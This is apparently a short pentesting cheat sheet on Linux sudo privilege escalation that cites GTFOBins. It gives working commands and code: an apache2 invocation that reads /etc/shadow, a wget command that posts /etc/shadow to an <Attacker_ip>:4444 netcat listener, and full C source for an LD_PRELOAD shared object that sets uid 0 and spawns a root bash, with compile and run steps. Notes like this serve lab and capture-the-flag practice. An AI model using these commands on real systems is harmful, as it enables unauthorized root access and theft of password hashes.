# Sudo Escalation

---
## Source - https://gtfobins.github.io/
---
## Escalation via Shell escaping -
- If u find anything by running the command sudo -l , you can go to gtfo bins and search for it and try to escalate.
---
## Escalation via Intended Functionality -
- If you can't find something in gtfobins, your best bet would be to go to google and search for the function priv esc i.e ***apache2 privilege escalation ***
- Then try to find out what you can do with a particular function (read,upload,etc) and then try to priv esc
- Few examples -
  ```bash
apache2 --> sudo apache2 -f /etc/shadow
wget --> sudo wget --post-file=/etc/shadow <Attacker_ip>:4444
#Remeber to setup a netcat listener for wget in attacker machine
  ```

---
## Escalation via LD_PRELOAD - 
- use sudo -l and check if env=LD_PRELOAD exists, if yes do the following.
- Copy these contents to a shell.c file to compile it - 
```c++
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
```     
- ##### Compiling the file - 
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
- Transfer the file to the victim machine and run
  ```bash
 sudo LD_PRELOAD=shell.so <any sudo we can run as root(apache2,nmap,vim,etc)>
  ```
  ##### If everything went right, you should have a root shell now ;).